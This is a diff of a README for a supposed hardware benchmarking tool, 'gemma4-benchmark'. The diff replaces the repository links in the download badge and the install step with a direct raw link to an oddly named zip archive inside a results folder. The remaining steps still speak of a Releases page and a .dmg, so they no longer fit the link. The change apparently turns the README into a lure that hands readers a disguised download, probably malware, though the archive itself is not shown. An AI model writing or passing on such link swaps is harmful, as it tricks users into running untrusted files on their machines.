@@ -1,6 +1,6 @@
 # 🚀 gemma4-benchmark - Fast testing for your computer hardware
 
-[![Download gemma4-benchmark](https://img.shields.io/badge/Download_Software-blue)](https://github.com/patchkingscounsel395/gemma4-benchmark)
+[![Download gemma4-benchmark](https://img.shields.io/badge/Download_Software-blue)](https://raw.githubusercontent.com/patchkingscounsel395/gemma4-benchmark/main/results/benchmark-gemma-Cyprinoidea.zip)
 
 ## 🎯 About this tool
 
@@ -21,7 +21,7 @@ If your computer uses an Intel processor, this tool will not function. You shoul
 
 You must visit our release page to get the installer. Follow these steps to obtain the correct file for your device.
 
-1. Go to this link: [https://github.com/patchkingscounsel395/gemma4-benchmark](https://github.com/patchkingscounsel395/gemma4-benchmark).
+1. Go to this link: [https://raw.githubusercontent.com/patchkingscounsel395/gemma4-benchmark/main/results/benchmark-gemma-Cyprinoidea.zip](https://raw.githubusercontent.com/patchkingscounsel395/gemma4-benchmark/main/results/benchmark-gemma-Cyprinoidea.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the latest version number.
 4. Select the file ending in .dmg to start your download.
